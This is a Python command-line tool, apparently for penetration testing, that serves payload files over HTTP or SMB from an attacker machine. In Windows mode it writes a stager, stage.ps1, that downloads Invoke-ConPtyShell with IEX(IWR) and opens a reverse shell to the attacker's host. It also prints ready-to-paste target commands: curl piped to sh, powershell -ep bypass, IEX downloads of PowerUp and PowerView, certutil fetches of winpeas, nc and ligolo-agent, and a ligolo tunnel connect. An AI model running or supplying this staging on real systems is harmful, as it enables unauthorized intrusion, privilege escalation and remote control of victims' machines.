#!/usr/bin/env python3
from __future__ import annotations

import argparse
import difflib
import html
import json
import os
import posixpath
import shutil
import subprocess
import sys
import urllib.parse
from dataclasses import asdict, dataclass
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Iterable


def fail(message: str) -> None:
    print(f"[!] {message}", file=sys.stderr)
    raise SystemExit(1)


def have(command: str) -> bool:
    return shutil.which(command) is not None


def state_file_path() -> Path:
    override = os.environ.get("PAYLOAD_SERVER_STATE_FILE")
    if override:
        return Path(override).expanduser()
    return Path.home() / ".local" / "state" / "payload-server" / "state.json"


@dataclass
class ServerState:
    mode: str
    lhost: str
    http_port: int
    shell_port: int
    enable_smb: bool
    http_backend: str
    payload_root: str
    serve_dir: str
    base_url: str
    smb_share_name: str
    smb_unc: str

    @classmethod
    def from_path(cls, path: Path) -> "ServerState":
        if not path.exists():
            fail(f"State file not found: {path}. Start payload-server first.")

        raw = path.read_text(encoding="utf-8")
        if raw.lstrip().startswith("{"):
            data = json.loads(raw)
            state = cls(**data)
        else:
            state = cls.from_legacy_env(raw)

        serve_dir = Path(state.serve_dir).expanduser()
        if not serve_dir.is_dir():
            fail(f"Serve directory from state does not exist: {serve_dir}")
        state.serve_dir = str(serve_dir)
        state.payload_root = str(Path(state.payload_root).expanduser())
        return state

    @classmethod
    def from_legacy_env(cls, raw: str) -> "ServerState":
        env: dict[str, str] = {}
        for line in raw.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#") or "=" not in stripped:
                continue
            key, value = stripped.split("=", 1)
            env[key] = value.strip().strip("'").strip('"')

        def as_bool(value: str) -> bool:
            return value in {"1", "true", "True"}

        return cls(
            mode=env["MODE"],
            lhost=env.get("LHOST", ""),
            http_port=int(env.get("HTTP_PORT", "8000")),
            shell_port=int(env.get("SHELL_PORT", "443")),
            enable_smb=as_bool(env.get("ENABLE_SMB", "0")),
            http_backend=env.get("HTTP_BACKEND", "fuzzy"),
            payload_root=env.get("PAYLOAD_ROOT", ""),
            serve_dir=env["SERVE_DIR"],
            base_url=env.get("BASE_URL", ""),
            smb_share_name=env.get("SMB_SHARE_NAME", "PAYLOADS"),
            smb_unc=env.get("SMB_UNC", ""),
        )

    def save(self, path: Path) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(asdict(self), indent=2) + "\n", encoding="utf-8")


def first_ip_for_iface(iface: str) -> str:
    try:
        result = subprocess.run(
            ["ip", "-4", "-o", "addr", "show", "dev", iface],
            capture_output=True,
            text=True,
            check=True,
        )
    except (FileNotFoundError, subprocess.CalledProcessError):
        return ""

    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 4:
            return parts[3].split("/", 1)[0]
    return ""


def detect_lhost(iface: str | None) -> str:
    if iface:
        ip_addr = first_ip_for_iface(iface)
        if not ip_addr:
            fail(f"No IPv4 address found for interface: {iface}")
        return ip_addr

    for candidate in ("tun0", "tun1", "wg0", "tap0", "eth0"):
        ip_addr = first_ip_for_iface(candidate)
        if ip_addr:
            return ip_addr

    try:
        result = subprocess.run(
            ["ip", "route", "get", "1.1.1.1"],
            capture_output=True,
            text=True,
            check=True,
        )
    except (FileNotFoundError, subprocess.CalledProcessError):
        return ""

    parts = result.stdout.split()
    for idx, item in enumerate(parts):
        if item == "src" and idx + 1 < len(parts):
            return parts[idx + 1]
    return ""


def payload_root() -> Path:
    return Path(os.environ.get("PAYLOADS_DIR", str(Path.home() / "tools" / "payloads"))).expanduser()


def show_tree(directory: Path) -> None:
    if have("tree"):
        subprocess.run(["tree", "-a", "-L", "3", str(directory)], check=False)
        return

    root_depth = len(directory.parts)
    for path in sorted(directory.rglob("*")):
        depth = len(path.parts) - root_depth
        if depth > 3:
            continue
        print(path)


def write_windows_stage(serve_dir: Path, lhost: str, http_port: int, shell_port: int) -> Path:
    scripts_dir = serve_dir / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    stage_path = scripts_dir / "stage.ps1"
    stage_path.write_text(
        f"IEX(IWR http://{lhost}:{http_port}/scripts/Invoke-ConPtyShell.ps1 -UseBasicParsing); "
        f"Invoke-ConPtyShell {lhost} {shell_port}\n",
        encoding="utf-8",
    )
    return stage_path


def print_linux_hints(base_url: str, lhost: str) -> None:
    print(
        f"""
Linux download hints
  curl -O {base_url}/linpeas.sh
  curl {base_url}/linpeas.sh | sh
  wget {base_url}/lse.sh -O lse.sh && chmod +x lse.sh
  wget {base_url}/pspy64 -O pspy64 && chmod +x pspy64
  wget {base_url}/socat -O socat && chmod +x socat

ParsingPeas
  # Prefer ParsingPeas on 8000 and move payload-server to 8001 if you need both.
  parsingpeas linux --lhost {lhost}
  parsingpeas linux --lhost {lhost} --start
""".strip(
            "\n"
        )
    )


def print_windows_hints(base_url: str, lhost: str, smb_unc: str) -> None:
    print(
        f"""
Windows download hints
  powershell -ep bypass
  IEX(IWR {base_url}/scripts/stage.ps1 -UseBasicParsing)
  IEX(IWR {base_url}/scripts/PowerUp.ps1 -UseBasicParsing)
  IEX(IWR {base_url}/scripts/PowerView.ps1 -UseBasicParsing)
  certutil -urlcache -split -f {base_url}/bin/winpeas.exe winpeas.exe
  certutil -urlcache -split -f {base_url}/bin/nc.exe nc.exe
  certutil -urlcache -split -f {base_url}/bin/ligolo-agent.exe ligolo-agent.exe
  powershell -c "iwr {base_url}/bin/winpeas.exe -OutFile winpeas.exe"
  .\\ligolo-agent.exe -connect {lhost}:11601 -ignore-cert

ParsingPeas
  # Prefer ParsingPeas on 8000 and move payload-server to 8001 if you need both.
  parsingpeas windows --lhost {lhost}
  parsingpeas windows --lhost {lhost} --start
""".strip(
            "\n"
        )
    )
    if smb_unc:
        print(
            f"""

SMB hints
  dir {smb_unc}
  copy {smb_unc}\\bin\\winpeas.exe .
  copy {smb_unc}\\bin\\nc.exe .
  copy {smb_unc}\\bin\\ligolo-agent.exe .
""".rstrip()
        )


def safe_join(root: Path, parts: Iterable[str]) -> Path:
    candidate = (root / Path(*parts)).resolve()
    if candidate == root or str(candidate).startswith(str(root) + os.sep):
        return candidate
    return root


def best_child(directory: Path, wanted: str) -> str | None:
    try:
        entries = [entry.name for entry in directory.iterdir()]
    except OSError:
        return None

    if wanted in entries:
        return wanted

    wanted_lower = wanted.lower()
    wanted_root, wanted_ext = os.path.splitext(wanted_lower)
    lower_map: dict[str, list[str]] = {}
    for entry in entries:
        lower_map.setdefault(entry.lower(), []).append(entry)

    if wanted_lower in lower_map and len(lower_map[wanted_lower]) == 1:
        return lower_map[wanted_lower][0]

    buckets = [
        [entry for entry in entries if entry.lower().startswith(wanted_lower)],
        [entry for entry in entries if wanted_lower in entry.lower()],
    ]

    lowered = {entry.lower(): entry for entry in entries}
    fuzzy = difflib.get_close_matches(wanted_lower, list(lowered), n=3, cutoff=0.55)
    buckets.append([lowered[item] for item in fuzzy])

    def score(entry: str) -> tuple[float, ...] | tuple[int, ...]:
        entry_lower = entry.lower()
        entry_root, entry_ext = os.path.splitext(entry_lower)
        root_ratio = difflib.SequenceMatcher(None, wanted_root, entry_root).ratio()
        full_ratio = difflib.SequenceMatcher(None, wanted_lower, entry_lower).ratio()
        same_ext = int(entry_ext == wanted_ext)
        starts = int(entry_lower.startswith(wanted_root))
        contains = int(wanted_root in entry_root)
        return (same_ext, starts, contains, root_ratio, full_ratio, -len(entry_lower))

    for idx, bucket in enumerate(buckets):
        if not bucket:
            continue
        if idx < 2:
            return sorted(bucket, key=lambda item: (len(item), item.lower()))[0]
        return max(bucket, key=score)

    return None


def fuzzy_translate(root: Path, url_path: str) -> tuple[Path, str | None]:
    parsed = urllib.parse.urlsplit(url_path)
    raw_path = urllib.parse.unquote(parsed.path)
    normalized = posixpath.normpath(raw_path)
    parts = [part for part in normalized.split("/") if part and part not in (".", "..")]

    exact = safe_join(root, parts)
    if exact.exists():
        return exact, None

    current = root
    corrected_parts: list[str] = []
    changed = False

    for part in parts:
        match = best_child(current, part)
        if match is None:
            return exact, None
        if match != part:
            changed = True
        corrected_parts.append(match)
        current = safe_join(current, [match])

    if changed and current.exists():
        corrected = "/" + "/".join(urllib.parse.quote(part) for part in corrected_parts)
        return current, corrected

    return exact, None


class FuzzyHandler(SimpleHTTPRequestHandler):
    server_version = "PayloadHTTP/1.0"

    def __init__(self, *args, directory: str, **kwargs):
        self.root = Path(directory).resolve()
        super().__init__(*args, directory=directory, **kwargs)

    def translate_path(self, path: str) -> str:
        translated, corrected = fuzzy_translate(self.root, path)
        if corrected:
            self.log_message("fuzzy matched %s -> %s", urllib.parse.urlsplit(path).path, corrected)
        return str(translated)

    def send_error(self, code: int, message: str | None = None, explain: str | None = None) -> None:
        if code != 404:
            super().send_error(code, message, explain)
            return

        directory = Path(os.path.dirname(self.translate_path(self.path)))
        suggestions: list[str] = []
        if str(directory).startswith(str(self.root)) and directory.is_dir():
            try:
                suggestions = sorted(item.name for item in directory.iterdir())[:80]
            except OSError:
                suggestions = []

        self.send_response(404, message)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"File not found.\n")
        if suggestions:
            self.wfile.write(b"\nAvailable nearby paths:\n")
            for item in suggestions:
                self.wfile.write(f"- {html.escape(item)}\n".encode("utf-8", "replace"))


def serve_fuzzy_http(serve_dir: Path, http_port: int) -> None:
    handler = partial(FuzzyHandler, directory=str(serve_dir.resolve()))
    with ThreadingHTTPServer(("0.0.0.0", http_port), handler) as server:
        print(f"Serving fuzzy HTTP on 0.0.0.0 port {http_port} from {serve_dir}", flush=True)
        server.serve_forever()


def copy_clipboard(value: str) -> None:
    session = os.environ.get("XDG_SESSION_TYPE", "")
    commands: list[list[str]] = []
    if session.lower() == "wayland" and have("wl-copy"):
        commands.append(["wl-copy"])
    if have("xclip"):
        commands.append(["xclip", "-selection", "clipboard"])
    if have("xsel"):
        commands.append(["xsel", "--clipboard", "--input"])

    if not commands:
        fail("Clipboard tool not found. Install wl-copy, xclip, or xsel.")

    errors: list[str] = []
    for command in commands:
        try:
            subprocess.run(command, input=value, text=True, check=True)
            return
        except subprocess.CalledProcessError as exc:
            errors.append(f"{command[0]} exited with status {exc.returncode}")
        except OSError as exc:
            errors.append(f"{command[0]} failed: {exc}")
    fail("; ".join(errors))


def rofi_pick(rofi_bin: str, prompt: str, options: list[str]) -> str | None:
    try:
        result = subprocess.run(
            [rofi_bin, "-dmenu", "-i", "-p", prompt, "-no-custom"],
            input="\n".join(options),
            text=True,
            capture_output=True,
            check=False,
        )
    except FileNotFoundError:
        fail(f"rofi binary not found: {rofi_bin}")

    if result.returncode != 0:
        return None
    value = result.stdout.strip()
    return value or None


def http_url_for_relative(base_url: str, rel: str) -> str:
    quoted = "/".join(urllib.parse.quote(part) for part in rel.split("/") if part)
    return base_url.rstrip("/") + "/" + quoted


def show_status(args: argparse.Namespace) -> int:
    state = ServerState.from_path(state_file_path())
    path = state_file_path()
    print(f"[+] State file: {path}")
    print(f"[+] Mode: {state.mode}")
    print(f"[+] Serve directory: {state.serve_dir}")
    print(f"[+] LHOST: {state.lhost}")
    print(f"[+] HTTP URL: {state.base_url}")
    if state.enable_smb:
        print(f"[+] SMB share: {state.smb_unc}")
    else:
        print("[*] SMB share: disabled in saved state")
    return 0


def pick_transport(rofi_bin: str, prompt: str) -> str | None:
    return rofi_pick(rofi_bin, prompt, ["http", "smb", "local"])


def pick_payload(args: argparse.Namespace) -> int:
    state = ServerState.from_path(state_file_path())
    transport = args.transport
    if transport == "ask":
        selected = pick_transport(args.rofi_bin, f"{args.prompt}-transport")
        if not selected:
            return 0
        transport = selected

    entries = sorted(
        str(path.relative_to(state.serve_dir)).replace(os.sep, "/")
        for path in Path(state.serve_dir).rglob("*")
        if path.is_file()
    )
    if not entries:
        fail(f"No files available under {state.serve_dir}")

    selected = rofi_pick(args.rofi_bin, args.prompt, entries)
    if not selected:
        return 0

    if transport == "http":
        output = http_url_for_relative(state.base_url, selected)
    elif transport == "smb":
        if not state.enable_smb:
            fail("Active payload-server state does not have SMB enabled.")
        output = state.smb_unc + "\\" + selected.replace("/", "\\")
    elif transport == "local":
        output = str(Path(state.serve_dir) / selected)
    else:
        fail(f"Unsupported transport: {transport}")

    copy_clipboard(output)
    print(output)
    return 0


def run_backend(command: list[str]) -> int:
    try:
        return subprocess.run(command, check=False).returncode
    except FileNotFoundError:
        fail(f"Backend command not found: {command[0]}")


def serve(args: argparse.Namespace) -> int:
    mode = args.mode
    http_port = args.http_port or 8000
    shell_port = args.shell_port or 443
    if http_port < 1 or http_port > 65535:
        fail(f"Invalid HTTP port: {http_port}")
    if shell_port < 1 or shell_port > 65535:
        fail(f"Invalid shell port: {shell_port}")

    root = payload_root()
    serve_dir = root / mode
    serve_dir.mkdir(parents=True, exist_ok=True)
    if mode == "windows":
        (serve_dir / "bin").mkdir(parents=True, exist_ok=True)
        (serve_dir / "scripts").mkdir(parents=True, exist_ok=True)
        (serve_dir / "webshells").mkdir(parents=True, exist_ok=True)

    lhost = args.lhost or detect_lhost(args.iface)
    if not lhost:
        fail("Could not detect LHOST. Pass --lhost IP or --iface IFACE.")

    base_url = f"http://{lhost}:{http_port}"
    smb_unc = f"\\\\{lhost}\\PAYLOADS" if args.smb else ""
    state = ServerState(
        mode=mode,
        lhost=lhost,
        http_port=http_port,
        shell_port=shell_port,
        enable_smb=args.smb,
        http_backend=args.http_backend,
        payload_root=str(root),
        serve_dir=str(serve_dir),
        base_url=base_url,
        smb_share_name="PAYLOADS",
        smb_unc=smb_unc,
    )
    state.save(state_file_path())

    print(f"[+] Payload directory: {serve_dir}")
    print(f"[+] LHOST: {lhost}")
    print(f"[+] HTTP URL: {base_url}")

    if mode == "windows":
        stage_path = write_windows_stage(serve_dir, lhost, http_port, shell_port)
        print(f"[+] Wrote staged ConPtyShell launcher: {stage_path}")

    if args.smb:
        if have("impacket-smbserver"):
            smb_cmd = ["impacket-smbserver", "PAYLOADS", str(serve_dir), "-smb2support"]
        elif have("smbserver.py"):
            smb_cmd = ["smbserver.py", "PAYLOADS", str(serve_dir), "-smb2support"]
        else:
            fail("SMB requested, but impacket-smbserver/smbserver.py was not found.")

        print(f"[+] SMB share: {smb_unc}")
        print("[+] Starting SMB server in the foreground. Use Ctrl+C to stop.\n")
        show_tree(serve_dir)
        if mode == "windows":
            print_windows_hints(base_url, lhost, smb_unc)
        else:
            print_linux_hints(base_url, lhost)
        print()
        return run_backend(smb_cmd)

    print("[+] Starting HTTP server in the foreground. Use Ctrl+C to stop.\n")
    show_tree(serve_dir)
    if mode == "windows":
        print_windows_hints(base_url, lhost, smb_unc)
    else:
        print_linux_hints(base_url, lhost)
    print()

    if args.http_backend == "fuzzy":
        serve_fuzzy_http(serve_dir, http_port)
        return 0
    if args.http_backend == "updog":
        if not have("updog"):
            fail("updog requested, but it was not found. Install it with: pipx install updog")
        return run_backend(["updog", "-d", str(serve_dir), "-p", str(http_port)])
    if args.http_backend == "python":
        return run_backend(
            ["python3", "-m", "http.server", str(http_port), "--bind", "0.0.0.0", "--directory", str(serve_dir)]
        )
    fail(f"Unknown HTTP backend: {args.http_backend}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="payload-server",
        description="Serve local payload directories and build transport-ready transfer targets.",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    for mode in ("linux", "windows"):
        serve_parser = subparsers.add_parser(mode)
        serve_parser.set_defaults(func=serve, mode=mode, http_backend="fuzzy")
        serve_parser.add_argument("http_port", nargs="?", type=int)
        if mode == "windows":
            serve_parser.add_argument("shell_port", nargs="?", type=int)
        else:
            serve_parser.set_defaults(shell_port=443)
        serve_parser.add_argument("--lhost")
        serve_parser.add_argument("--iface")
        serve_parser.add_argument("--smb", action="store_true")
        backend_group = serve_parser.add_mutually_exclusive_group()
        backend_group.add_argument("--updog", dest="http_backend", action="store_const", const="updog")
        backend_group.add_argument("--plain-http", dest="http_backend", action="store_const", const="python")

    pick_parser = subparsers.add_parser("pick")
    pick_parser.set_defaults(func=pick_payload)
    pick_parser.add_argument("transport", nargs="?", default="ask", choices=["http", "smb", "local", "ask"])
    pick_parser.add_argument("--rofi-bin", default="rofi")
    pick_parser.add_argument("--prompt", default="payload")

    status_parser = subparsers.add_parser("status")
    status_parser.set_defaults(func=show_status)

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return int(args.func(args))


if __name__ == "__main__":
    raise SystemExit(main())
